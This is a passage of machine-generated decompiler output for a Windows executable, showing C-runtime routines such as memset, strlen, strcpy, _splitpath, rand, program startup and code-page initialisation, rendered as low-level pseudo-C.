		}
	}
	return eax_42;
}

// 004076F0: void fn004076F0(Stack Eq_2 dwArg04, Stack byte bArg08, Stack Eq_2094 dwArg0C)
void fn004076F0(Eq_2 dwArg04, byte bArg08, Eq_2094 dwArg0C)
{
	Eq_2094 edx_3 = dwArg0C;
	if (dwArg0C == 0x00)
		return;
	byte al_22 = bArg08;
	ui32 eax_23 = (word32) bArg08;
	Eq_2 edi_27 = dwArg04;
	if (dwArg0C >= 0x04)
	{
		ui32 ecx_52 = -dwArg04;
		ui32 ecx_53 = ecx_52 & 0x03;
		if ((ecx_52 & 0x03) != 0x00)
		{
			edx_3 = dwArg0C - (ecx_52 & 0x03);
			do
			{
				edi_27->u0 = bArg08;
				edi_27 = (word32) edi_27 + 0x01;
				ecx_53 = ecx_53 - 0x01;
			} while (ecx_53 != 0x00);
		}
		Eq_4968 eax_65 = eax_23 * 0x01010000 + eax_23 * 0x0101;
		al_22 = (byte) eax_65;
		edx_3 = edx_3 & 0x03;
		uint32 ecx_69 = edx_3 >> 0x02;
		if (ecx_69 != 0x00)
		{
			while (ecx_69 != 0x00)
			{
				*edi_27 = eax_65;
				edi_27 = (word32) edi_27 + 0x04;
				ecx_69 = ecx_69 - 0x01;
			}
			if (edx_3 == 0x00)
				return;
		}
	}
	do
	{
		edi_27->u0 = al_22;
		edi_27 = (word32) edi_27 + 0x01;
		edx_3 = edx_3 - 0x01;
	} while (edx_3 != 0x00);
}

// 00407750: Register word32 fn00407750(Stack Eq_2 dwArg04)
word32 fn00407750(Eq_2 dwArg04)
{
	return fn004077C1(dwArg04);
}

// 00407760: void fn00407760(Stack Eq_2 dwArg04)
void fn00407760(Eq_2 dwArg04)
{
	Eq_2 ecx_22 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		do
		{
			ecx_22 = (word32) ecx_22 + 0x01;
			if (*ecx_22 == 0x00)
				goto l004077AF;
		} while ((ecx_22 & 0x03) != 0x00);
	}
	do
	{
		do
		{
			word32 eax_35 = *ecx_22;
			ecx_22 = (word32) ecx_22 + 0x04;
		} while (((eax_35 ^ ~0x00 ^ eax_35 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_44 = *(ecx_22 - 0x04);
		byte ah_46 = SLICE(eax_44, byte, 8);
		if ((byte) eax_44 == 0x00)
		{
			fn004077C1(ecx_22 - 0x04);
			return;
		}
		if (ah_46 == 0x00)
		{
			fn004077C1(ecx_22 - 0x03);
			return;
		}
		if ((eax_44 & 0x00FF0000) == 0x00)
		{
			fn004077C1(ecx_22 - 0x02);
			return;
		}
	} while ((eax_44 & 0xFF000000) != 0x00);
l004077AF:
	Eq_2 edi_29 = ecx_22 - 0x01;
	fn004077C1(edi_29);
}

// 004077C1: Register Eq_2 fn004077C1(Register Eq_2 edi)
Eq_2 fn004077C1(Eq_2 edi)
{
	byte dl_24;
	byte * ecx_3 = v3->ptr000C;
	if ((ecx_3 & 0x03) != 0x00)
	{
		do
		{
			dl_24 = *ecx_3;
			ecx_3 = ecx_3 + 0x01;
			if (dl_24 == 0x00)
				goto l00407838;
			edi->u0 = dl_24;
			edi = (word32) edi + 0x01;
		} while ((ecx_3 & 0x03) != 0x00);
	}
l004077E6:
	Eq_5104 edx_45 = *ecx_3;
	Eq_5108 eax_41 = *ecx_3;
	dl_24 = (byte) edx_45;
	byte dh_47 = SLICE(edx_45, byte, 8);
	Eq_5115 dx_48 = (word16) edx_45;
	ecx_3 = ecx_3 + 0x04;
	if (((eax_41 ^ ~0x00 ^ (word32) eax_41 + 0x7EFEFEFF) & 0x81010100) != 0x00)
	{
		if (dl_24 == 0x00)
		{
l00407838:
			edi->u0 = dl_24;
			return v3->t0000;
		}
		if (dh_47 == 0x00)
		{
			*edi = dx_48;
			return v3->t0000;
		}
		if ((edx_45 & 0x00FF0000) == 0x00)
		{
			*edi = dx_48;
			((word32) edi + 0x02)->u0 = 0x00;
			return v3->t0000;
		}
		if ((edx_45 & 0xFF000000) == 0x00)
		{
			*edi = edx_45;
			return v3->t0000;
		}
	}
	*edi = edx_45;
	edi = (word32) edi + 0x04;
	goto l004077E6;
}

// 00407840: Register ptr32 fn00407840(Stack Eq_2 dwArg04)
ptr32 fn00407840(Eq_2 dwArg04)
{
	Eq_2 ecx_24 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		do
		{
			ecx_24 = (word32) ecx_24 + 0x01;
			if (*ecx_24 == 0x00)
				return ecx_24 - 0x01 - dwArg04;
		} while ((ecx_24 & 0x03) != 0x00);
	}
	do
	{
		do
		{
			word32 eax_36 = *ecx_24;
			ecx_24 = (word32) ecx_24 + 0x04;
		} while (((eax_36 ^ ~0x00 ^ eax_36 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_45 = *(ecx_24 - 0x04);
		byte ah_47 = SLICE(eax_45, byte, 8);
		if ((byte) eax_45 == 0x00)
			return ecx_24 - 0x04 - dwArg04;
		if (ah_47 == 0x00)
			return ecx_24 - 0x03 - dwArg04;
		if ((eax_45 & 0x00FF0000) == 0x00)
			return ecx_24 - 0x02 - dwArg04;
	} while ((eax_45 & 0xFF000000) != 0x00);
	return ecx_24 - 0x01 - dwArg04;
}

// 004078BB: Register Eq_2 fn004078BB(Register Eq_2 ecx, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10, Stack Eq_2 dwArg14)
Eq_2 fn004078BB(Eq_2 ecx, Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_2 dwArg10, Eq_2 dwArg14)
{
	Eq_2 dwLoc08_10 = ecx & 0x00;
	Eq_2 ebx_17 = dwArg04;
	Eq_2 ecx_117 = dwArg04;
	if (fn00407840(dwArg04) >= 0x01 && *((word32) dwArg04 + 0x01) == 0x3A)
	{
		if (dwArg08 != 0x00)
		{
			ecx_117 = fn00408977(dwArg08, dwArg04, (Eq_2 (*)[]) 0x02);
			((word32) dwArg08 + 0x02)->u0 = *((word32) dwArg08 + 0x02) & 0x00;
		}
		ebx_17 = (word32) dwArg04 + 0x02;
	}
	else if (dwArg08 != 0x00)
		*dwArg08 = *dwArg08 & 0x00;
	Eq_2 dwArg08_198 = dwArg08 & 0x00;
	Eq_2 eax_129 = ebx_17;
	Eq_2 (* esi_110)[] = (Eq_2 (*)[]) 0xFF;
	Eq_2 dwArg04_184 = ebx_17;
	if (*ebx_17 != 0x00)
	{
		do
		{
			byte cl_203 = *eax_129;
			ecx_117 = DPB(ecx_117, cl_203, 0);
			if ((((word32) cl_203)->b494D61 & 0x04) != 0x00)
				eax_129 = (word32) eax_129 + 0x01;
			else if (cl_203 != 0x2F && cl_203 != 0x5C)
			{
				if (cl_203 == 0x2E)
					dwLoc08_10 = eax_129;
			}
			else
			{
				ecx_117 = (word32) eax_129 + 0x01;
				dwArg08_198 = ecx_117;
			}
			eax_129 = (word32) eax_129 + 0x01;
		} while (*eax_129 != 0x00);
		dwArg04_184 = eax_129;
		if (dwArg08_198 != 0x00)
		{
			if (dwArg0C != 0x00)
			{
				Eq_2 (* edi_237)[] = dwArg08_198 - ebx_17;
				if (edi_237 >= (Eq_2 (*)[]) 0xFF)
					edi_237 = (Eq_2 (*)[]) 0xFF;
				ecx_117 = fn00408977(dwArg0C, ebx_17, edi_237);
				Mem253[edi_237 + dwArg0C:byte] = Mem0[edi_237 + dwArg0C:byte] & 0x00;
			}
			ebx_17 = dwArg08_198;
l00407982:
			if (dwLoc08_10 != 0x00 && dwLoc08_10 >= ebx_17)
			{
				if (dwArg10 != 0x00)
				{
					Eq_2 (* edi_160)[] = dwLoc08_10 - ebx_17;
					if (edi_160 >= (Eq_2 (*)[]) 0xFF)
						edi_160 = (Eq_2 (*)[]) 0xFF;
					ecx_117 = fn00408977(dwArg10, ebx_17, edi_160);
					Mem176[edi_160 + dwArg10:byte] = Mem0[edi_160 + dwArg10:byte] & 0x00;
					eax_129 = dwArg04_184;
				}
				if (dwArg14 != 0x00)
				{
					Eq_2 (* eax_141)[] = eax_129 - dwLoc08_10;
					if (eax_141 < (Eq_2 (*)[]) 0xFF)
						esi_110 = eax_141;
					ecx_117 = fn00408977(dwArg14, dwLoc08_10, esi_110);
					Mem156[esi_110 + dwArg14:byte] = Mem0[esi_110 + dwArg14:byte] & 0x00;
				}
			}
			else
			{
				if (dwArg10 != 0x00)
				{
					Eq_2 (* eax_107)[] = eax_129 - ebx_17;
					if (eax_107 < (Eq_2 (*)[]) 0xFF)
						esi_110 = eax_107;
					ecx_117 = fn00408977(dwArg10, ebx_17, esi_110);
					Mem121[esi_110 + dwArg10:byte] = Mem0[esi_110 + dwArg10:byte] & 0x00;
				}
				if (dwArg14 != 0x00)
					*dwArg14 = *dwArg14 & 0x00;
			}
			return ecx_117;
		}
	}
	ecx_117 = dwArg0C;
	if (dwArg0C != 0x00)
		*dwArg0C = *dwArg0C & 0x00;
	goto l00407982;
}

// 00407ACE: Register byte fn00407ACE(Register Eq_2 ecx, Stack Eq_5408 dwArg04, Stack byte bArg05, Stack byte bArg06, Register out ptr32 ecxOut)
byte fn00407ACE(Eq_2 ecx, Eq_5408 dwArg04, byte bArg05, byte bArg06, ptr32 & ecxOut)
{
	*ecxOut = ecx;
	byte al_109;
	if (globals->t49393C == 0x00)
	{
		al_109 = (byte) dwArg04;
		if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
			al_109 = (byte) ((word32) dwArg04.u0 + 0x0020);
		return al_109;
	}
	if (dwArg04 < 0x0100)
	{
		ui32 eax_191;
		if (globals->dw412C1C > 0x01)
		{
			eax_191 = fn00408C50(dwArg04, SLICE(dwArg04, word16, 16), 0x01);
			word32 ecx_206;
			*ecxOut = 0x01;
		}
		else
		{
			Eq_12633 eax_208[] = globals->ptr412A10;
			eax_191 = DPB(eax_208, eax_208[dwArg04].t0000, 0) & 0x01;
		}
		if (eax_191 == 0x00)
		{
l00407B2B:
			al_109 = (byte) dwArg04;
			return al_109;
		}
	}
	int32 eax_126;
	if ((globals->ptr412A10[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
		eax_126 = 0x02;
	else
		eax_126 = 0x01;
	word32 ecx_147;
	Eq_2 eax_148 = fn00408A01(fp - 0x04, globals->t49393C, 0x0100, 0x01, fp + 0x04, eax_126, fp - 0x08, (CHAR *) 0x03, 0x00, 0x01, out ecx_147);
	if (eax_148 != 0x00)
	{
		if (eax_148 == 0x01)
			al_109 = (byte) (word32) bLoc08;
		else
		{
			ui32 ecx_161 = (word32) bLoc08;
			*ecxOut = ecx_161;
			al_109 = (byte) ((word32) bLoc07 << 0x08 | ecx_161);
		}
		return al_109;
	}
	goto l00407B2B;
}

// 00407BEB: Register Eq_2 fn00407BEB(Register Eq_3320 ebp, Stack Eq_2 dwArg04, Register out ptr32 ebpOut, Register out ptr32 ediOut)
Eq_2 fn00407BEB(LPCH ebp, Eq_2 dwArg04, ptr32 & ebpOut, ptr32 & ediOut)
{
	word32 ebp_7;
	word32 edi_8;
	return fn004095E4(ebp, dwArg04, out ebp_7, out edi_8);
}

// 00407C00: Register word32 fn00407C00(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00407C00(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, ptr32 & esiOut, ptr32 & ediOut)
{
	Eq_2 esi_13 = dwArg08;
	Eq_2 edi_17 = dwArg04;
	word32 eax_20 = dwArg0C + dwArg08;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
				;
			else
			{
				word32 esp_71;
				word32 ebp_72;
				word32 edi_73;
				word32 esi_74;
				word32 ecx_75;
				word32 eax_76;
				word32 edx_77;
				byte SCZO_78;
				byte CZ_79;
				byte C_80;
				byte SZO_81;
				byte Z_82;
				byte D_83;
				(*((char *) globals->a407C60 + (dwArg04 & 0x03) * 0x04))();
				return ebp_72;
			}
		}
		else
		{
			uint32 ecx_42 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
				;
			else
			{
				while (ecx_42 != 0x00)
				{
					*edi_17 = *esi_13;
					esi_13 = (word32) esi_13 + 0x04;
					edi_17 = (word32) edi_17 + 0x04;
					ecx_42 = ecx_42 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_56;
					*esiOut = esi;
					word32 edi_58;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_101 = (word32) dwArg08 + (dwArg0C - 0x04);
		word32 * edi_102 = (word32) dwArg04 + (dwArg0C - 0x04);
		if ((edi_102 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
				;
			else
			{
				word32 esp_135;
				word32 ebp_136;
				word32 edi_137;
				word32 esi_138;
				word32 ecx_139;
				word32 eax_140;
				word32 edx_141;
				byte SCZO_142;
				byte CZ_143;
				byte C_144;
				byte SZO_145;
				byte Z_146;
				byte D_147;
				(*((char *) globals->a407DE8 + (edi_102 & 0x03) * 0x04))();
				return ebp_136;
			}
		}
		else
		{
			uint32 ecx_103 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_112 = -(dwArg0C >> 0x02);
				word32 esp_115;
				word32 ebp_116;
				word32 edi_117;
				word32 esi_118;
				word32 ecx_119;
				word32 eax_120;
				word32 edx_121;
				byte SCZO_122;
				byte CZ_123;
				byte C_124;
				byte SZO_125;
				byte Z_126;
				byte D_127;
				(*((char *) globals->a407E90 + ecx_112 * 0x04))();
				return ebp_116;
			}
			else
			{
				while (ecx_103 != 0x00)
				{
					*edi_102 = *esi_101;
					esi_101 = esi_101 - 0x04;
					edi_102 = edi_102 - 0x04;
					ecx_103 = ecx_103 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_106;
					*esiOut = esi;
					word32 edi_108;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
}

// 00407F35: void fn00407F35(Stack Eq_2 dwArg04)
void fn00407F35(Eq_2 dwArg04)
{
	globals->t412900 = dwArg04;
}

// 00407F3F: Register ui32 fn00407F3F()
ui32 fn00407F3F()
{
	Eq_2 eax_5 = globals->t412900 *s 0x000343FD + 2531011;
	globals->t412900 = eax_5;
	return eax_5 >> 0x10 & 0x7FFF;
}

// 00407F60: void fn00407F60(Register uint32 eax, Stack ptr32 dwArg00)
void fn00407F60(uint32 eax, ptr32 dwArg00)
{
	ptr32 ecx_10 = fp + 0x04;
	if (eax >= 0x1000)
	{
		do
		{
			ecx_10 = ecx_10 - 0x1000;
			eax = eax - 0x1000;
		} while (eax >= 0x1000);
	}
	*(ecx_10 - eax - 0x04) = dwArg00;
}

// 00407F8F: Register word32 fn00407F8F(Register Eq_3320 ebp, Stack Eq_2 dwArg04, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00407F8F(LPCH ebp, Eq_2 dwArg04, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 ebx_9;
	word32 esi_10;
	word32 edi_11;
	return fn00409625(ebp, dwArg04, out ebx_9, out esi_10, out edi_11);
}

// 00407FE0: Register word32 fn00407FE0(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Register out Eq_5725 esiOut)
word32 fn00407FE0(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_5725 & esiOut)
{
	Eq_2 esi_13 = dwArg08;
	Eq_2 edi_17 = dwArg04;
	word32 eax_20 = dwArg0C + dwArg08;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
				;
			else
			{
				word32 esp_70;
				word32 ebp_71;
				word32 edi_72;
				word32 esi_73;
				word32 ecx_74;
				word32 eax_75;
				word32 edx_76;
				byte SCZO_77;
				byte CZ_78;
				byte C_79;
				byte SZO_80;
				byte Z_81;
				byte D_82;
				(*((char *) globals->a408040 + (dwArg04 & 0x03) * 0x04))();
				return ebp_71;
			}
		}
		else
		{
			uint32 ecx_41 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
				;
			else
			{
				while (ecx_41 != 0x00)
				{
					*edi_17 = *esi_13;
					esi_13 = (word32) esi_13 + 0x04;
					edi_17 = (word32) edi_17 + 0x04;
					ecx_41 = ecx_41 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_55;
					*esiOut = esi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_100 = (word32) dwArg08 + (dwArg0C - 0x04);
		word32 * edi_101 = (word32) dwArg04 + (dwArg0C - 0x04);
		if ((edi_101 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
				;
			else
			{
				word32 esp_134;
				word32 ebp_135;
				word32 edi_136;
				word32 esi_137;
				word32 ecx_138;
				word32 eax_139;
				word32 edx_140;
				byte SCZO_141;
				byte CZ_142;
				byte C_143;
				byte SZO_144;
				byte Z_145;
				byte D_146;
				(*((char *) globals->a4081C8 + (edi_101 & 0x03) * 0x04))();
				return ebp_135;
			}
		}
		else
		{
			uint32 ecx_102 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_111 = -(dwArg0C >> 0x02);
				word32 esp_114;
				word32 ebp_115;
				word32 edi_116;
				word32 esi_117;
				word32 ecx_118;
				word32 eax_119;
				word32 edx_120;
				byte SCZO_121;
				byte CZ_122;
				byte C_123;
				byte SZO_124;
				byte Z_125;
				byte D_126;
				(*((char *) globals->a408270 + ecx_111 * 0x04))();
				return ebp_115;
			}
			else
			{
				while (ecx_102 != 0x00)
				{
					*edi_101 = *esi_100;
					esi_100 = esi_100 - 0x04;
					edi_101 = edi_101 - 0x04;
					ecx_102 = ecx_102 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_105;
					*esiOut = esi;
					return ebp;
				}
			}
		}
	}
}

// 00408420: Register Eq_2 fn00408420(Stack Eq_2 dwArg04, Stack (ptr byte) dwArg08, Stack Eq_2 dwArg0C)
Eq_2 fn00408420(Eq_2 dwArg04, byte * dwArg08, Eq_2 dwArg0C)
{
	Eq_2 ecx_16 = dwArg0C;
	if (dwArg0C != 0x00)
	{
		Eq_2 edi_40 = dwArg04;
		while (ecx_16 != 0x00)
		{
			edi_40 = (word32) edi_88 + 0x01;
			ecx_16 = ecx_16 - 0x01;
			Eq_2 edi_88 = edi_40;
			if (0x00 != *edi_88)
				break;
		}
		word32 ecx_53 = (word32) dwArg0C + -ecx_16;
		Eq_2 edi_55 = dwArg04;
		byte * esi_57 = dwArg08;
		while (ecx_53 != 0x00)
		{
			esi_57 = esi_57 + 0x01;
			edi_55 = (word32) edi_55 + 0x01;
			ecx_53 = ecx_53 - 0x01;
			if (*esi_57 == *edi_55)
				break;
		}
		cu8 al_66 = *(esi_57 - 0x01);
		ecx_16.u0 = 0x00;
		if (al_66 > *(edi_55 - 0x01))
		{
l0040844F:
			ecx_16 = ~ecx_16;
			return ecx_16;
		}
		if (al_66 != *(edi_55 - 0x01))
		{
			ecx_16.u0 = ~0x01;
			goto l0040844F;
		}
	}
	return ecx_16;
}

// 00408458: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	Eq_2 eax_29 = GetVersion();
	word32 edx_33 = (word32) SLICE(eax_29, byte, 8);
	globals->dw49396C = edx_33;
	globals->dw493968 = eax_29 & 0xFF;
	globals->dw493964 = ((eax_29 & 0xFF) << 0x08) + edx_33;
	globals->dw493960 = eax_29 >> 0x10;
	if (fn0040AACD(0x00) == 0x00)
	{
		*(fp - 0x7C) = 0x1C;
		fn00408573(fp - 0x04, edi);
	}
	word32 eax_111;
	ui32 ecx_56 = fn0040A922(fp - 0x04);
	globals->t494E68 = GetCommandLineA();
	globals->t493920 = fn0040A7F0(ecx_56);
	ptr32 ebp_62 = fn0040A4EA(fn0040A5A3(ecx_56, fp - 0x04), fp - 0x04);
	word32 esi_63 = fn0040A20C();
	*(ebp_62 - 0x30) = esi_63;
	*(fp - 0x7C) = ebp_62 - 0x5C;
	GetStartupInfoA(*(fp - 0x7C));
	*(ebp_62 - 100) = fn0040A492();
	if ((*(ebp_62 - 0x30) & 0x01) != 0x00)
		eax_111 = (word32) *(ebp_62 - 44);
	else
	{
		*(fp - 0x80) = 0x0A;
		eax_111 = *(fp - 0x80);
	}
	*(fp - 0x80) = eax_111;
	*(fp - 0x84) = *(ebp_62 - 100);
	*(fp - 0x88) = esi_63;
	*(fp - 0x8C) = esi_63;
	*(fp - 0x90) = (HMODULE *) GetModuleHandleA(*(fp - 0x8C));
	word32 ebx_88;
	word32 esi_89;
	word32 edi_90;
	word32 eax_91 = fn004073E2(ebp_62, out ebx_88, out esi_89, out edi_90);
	*(ebp_62 - 0x60) = eax_91;
	*(fp - 0x84) = eax_91;
	fn0040A239(ebx_88, esi_89, edi_90, dwArg00);
	word32 ** eax_97 = *(ebp_62 - 0x14);
	word32 ecx_99 = **eax_97;
	*(ebp_62 - 0x68) = ecx_99;
	*(fp - 0x88) = eax_97;
	*(fp - 0x8C) = ecx_99;
	return fn0040A30E(dwArg00, dwArg04);
}

// 0040854E: Register byte fn0040854E(Register Eq_3320 ebp, Register Eq_2 edi, Register out (ptr (ptr Eq_8279)) esiOut, Register out ptr32 ediOut)
byte fn0040854E(LPCH ebp, Eq_2 edi, Eq_8279 * * & esiOut, ptr32 & ediOut)
{
	if (globals->dw493928 == 0x01)
		edi = fn0040ACDC(ebp, edi);
	*(fp - 0x04) = fp->dw0004;
	word32 edi_12;
	byte bl_13 = fn0040AD15(ebp, edi, dwArg00, out edi_12);
	*(fp - 0x08) = 0xFF;
	word32 esp_16;
	byte SCZO_17;
	byte Z_18;
	word32 ecx_19;
	word32 ebp_20;
	word32 edi_21;
	byte bl_22;
	word32 esi_23;
	globals->ptr412910();
	return bl_22;
}

// 00408573: void fn00408573(Register Eq_3320 ebp, Register Eq_2 edi)
void fn00408573(LPCH ebp, Eq_2 edi)
{
	if (globals->dw493928 == 0x01)
		edi = fn0040ACDC(ebp, edi);
	*(fp - 0x04) = fp->dw0004;
	word32 edi_12;
	fn0040AD15(ebp, edi, dwArg00, out edi_12);
	*(fp - 0x04) = 0xFF;
	ExitProcess(*(fp - 0x04));
}

// 00408597: Register byte fn00408597(Stack Eq_430 dwArg04)
byte fn00408597(Eq_430 dwArg04)
{
	Eq_430 eax_21 = fn00408730(dwArg04);
	struct Eq_6244 * esp_101 = fp - 0x28;
	if (eax_21 == globals->t494C38)
		return (byte) esp_101->dw0008;
	if (eax_21 != 0x00)
	{
		ui32 edx_120 = 0x00;
		union Eq_430 * eax_124 = globals->a412920;
		do
		{
			if (*eax_124 == eax_21)
			{
				word32 ecx_266 = 0x40;
				struct Eq_6262 * edi_268 = globals->a494D60;
				while (ecx_266 != 0x00)
				{
					edi_268->b0000 = (byte) 0x00;
					edi_268 = edi_268 + 0x01;
					ecx_266 = ecx_266 - 0x01;
				}
				edi_268->b0000 = 0x00;
				ui32 esi_274 = edx_120 * 0x03;
				byte * dwLoc08_275 = globals->a412918;
				struct Eq_6410 * ebx_280 = (esi_274 << 0x04) + 0x00412930;
				do
				{
					byte * ecx_295 = &ebx_280->b0000 + 0x01;
					if (ebx_280->b0000 != 0x00)
					{
						do
						{
							byte dl_341 = *ecx_295;
							if (dl_341 == 0x00)
								break;
							struct Eq_6439 * eax_346 = (word32) *ecx_295;
							struct Eq_6439 * edi_348 = (word32) dl_341;
							if (eax_346 <= edi_348)
							{
								byte dl_362 = *dwLoc08_275;
								do
								{
									eax_346[0x00494D61] = (struct Eq_6439) (eax_346[0x00494D61] | dl_362);
									eax_346 = eax_346 + 0x01;
								} while (eax_346 <= edi_348);
							}
							struct Eq_6447 * ecx_357 = ecx_295 + 0x01;
							ecx_295 = (byte *) &ecx_357->b0001;
						} while (ecx_357->b0001 != 0x00);
					}
					byte * v22_305 = dwLoc08_275 + 0x01;
					dwLoc08_275 = v22_305;
					ebx_280 = ebx_280 + 0x01;
				} while (v22_305 < (byte *) 4290696940);
				globals->dw494C4C = 0x01;
				globals->t494C38 = eax_21;
				Eq_2 eax_316 = fn0040877A(eax_21);
				struct Eq_6485 * esi_317 = (esi_274 << 0x04) + 0x00412924;
				globals->dw494C40 = esi_317->dw0000;
				globals->dw494C44 = esi_317->dw0004;
				globals->t494E64 = eax_316;
				globals->dw494C48 = esi_317->dw0008;
				esp_101 = fp - 0x28;
				goto l0040871F;
			}
			eax_124 = (union Eq_430 *) ((char *) eax_124 + 0x0030);
			edx_120 = edx_120 + 0x01;
		} while (eax_124 < &globals->ptr412A10);
		esp_101 = fp - 0x30;
		if (GetCPInfo(eax_21, fp - 0x1C) == 0x01)
		{
			globals->t494C38 = eax_21;
			word32 ecx_152 = 0x40;
			struct Eq_6293 * edi_154 = globals->a494D60;
			while (ecx_152 != 0x00)
			{
				edi_154->b0000 = (byte) 0x00;
				edi_154 = edi_154 + 0x01;
				ecx_152 = ecx_152 - 0x01;
			}
			edi_154->b0000 = 0x00;
			globals->t494E64.u0 = 0x00;
			if (dwLoc1C > 0x01)
			{
				if (bLoc16 != 0x00)
				{
					byte * ecx_221 = fp - 0x15;
					do
					{
						byte dl_228 = *ecx_221;
						if (dl_228 == 0x00)
							break;
						struct Eq_6330 * eax_233 = (word32) *(ecx_221 - 0x01);
						struct Eq_6330 * edx_235 = (word32) dl_228;
						while (eax_233 <= edx_235)
						{
							eax_233[0x00494D61] = (struct Eq_6330) (eax_233[0x00494D61] | 0x04);
							eax_233 = eax_233 + 0x01;
						}
						byte * ecx_250 = ecx_221 + 0x01;
						ecx_221 = ecx_250 + 0x01;
					} while (*ecx_250 != 0x00);
				}
				struct Eq_6325 * eax_203 = (struct Eq_6325 *) 0x01;
				do
				{
					eax_203[0x00494D61] = (struct Eq_6325) (eax_203[0x00494D61] | 0x08);
					eax_203 = eax_203 + 0x01;
				} while (eax_203 < (struct Eq_6325 *) 0xFF);
				globals->t494E64 = fn0040877A(eax_21);
				globals->dw494C4C = 0x01;
			}
			else
				globals->dw494C4C = 0x00;
			globals->dw494C40 = 0x00;
			globals->dw494C44 = 0x00;
			globals->dw494C48 = 0x00;
			esp_101 = fp - 0x30;
l0040871F:
			fn004087D6();
			return (byte) esp_101->dw0008;
		}
		if (globals->dw49392C == 0x00)
			return (byte) esp_101->dw0008;
	}
	fn004087AD();
	goto l0040871F;
}

// 00408730: Register Eq_430 fn00408730(Stack Eq_430 dwArg04)
Eq_430 fn00408730(Eq_430 dwArg04)
{
	globals->dw49392C = globals->dw49392C & 0x00;
	Eq_430 eax_21 = dwArg04;
	if (dwArg04 != ~0x01)
	{
		if (dwArg04 != ~0x02)
		{
			if (dwArg04 == ~0x03)
			{
				eax_21 = globals->t49394C;
				globals->dw49392C = 0x01;
			}
			return eax_21;
		}
		else
		{
			globals->dw49392C = 0x01;
			return GetACP();
		}
	}
	else
	{
		globals->dw49392C = 0x01;
		return GetOEMCP();
	}
}

// 0040877A: Register word32 fn0040877A(Stack Eq_430 dwArg04)
word32 fn0040877A(Eq_430 dwArg04)
{
	if (dwArg04 == 0x03A4)
		return 0x0411;
	else if (dwArg04 == 0x03A8)
		return 0x0804;
	else if (dwArg04 == 949)
		return 0x0412;
	else if (dwArg04 == 0x03B6)
		return 0x0404;
	else
		return 0x00;
}

// 004087AD: void fn004087AD()
void fn004087AD()
{
	word32 ecx_15 = 0x40;
	struct Eq_6554 * edi_13 = globals->a494D60;
	while (ecx_15 != 0x00)
	{
		edi_13->b0000 = (byte) 0x00;
		edi_13 = edi_13 + 0x01;
		ecx_15 = ecx_15 - 0x01;
	}
	edi_13->b0000 = 0x00;
	globals->t494C38.u0 = 0x00;
	globals->dw494C4C = 0x00;
	globals->t494E64.u0 = 0x00;
	globals->dw494C40 = 0x00;
	globals->dw494C44 = 0x00;
	globals->dw494C48 = 0x00;
}

// 004087D6: void fn004087D6()
void fn004087D6()
{
	if (GetCPInfo(globals->t494C38, fp - 0x18) == 0x01)
	{
		Eq_6601 eax_64 = 0x00;
		byte al_65 = 0x00;
		do
		{
			*((word32) eax_64 + (fp - 0x0118)) = al_65;
			eax_64 = (word32) eax_64 + 0x01;
			al_65 = (byte) eax_64;
		} while (eax_64 < 0x0100);
		byte al_234 = bLoc12;
		if (bLoc12 != 0x00)
		{
			byte * edx_225 = fp - 0x11;
			do
			{
				Eq_6697 ecx_237 = (word32) *edx_225;
				Eq_6697 eax_239 = (word32) al_234;
				if (eax_239 <= ecx_237)
				{
					uint32 ecx_262 = ecx_237 - eax_239;
					union Eq_6700 * edi_263 = (word32) eax_239 + (fp - 0x0118);
					uint32 ecx_267 = ecx_262 + 0x01 >> 0x02;
					while (ecx_267 != 0x00)
					{
						*edi_263 = 0x20202020;
						edi_263 = (union Eq_6700 *) ((char *) edi_263 + 0x04);
						ecx_267 = ecx_267 - 0x01;
					}
					ui32 ecx_278 = ecx_262 + 0x01 & 0x03;
					while (ecx_278 != 0x00)
					{
						*edi_263 = (union Eq_6700 *) 0x20;
						edi_263 = (union Eq_6700 *) ((char *) edi_263 + 0x01);
						ecx_278 = ecx_278 - 0x01;
					}
				}
				byte * edx_249 = edx_225 + 0x01;
				edx_225 = edx_249 + 0x01;
				al_234 = *edx_249;
			} while (al_234 != 0x00);
		}
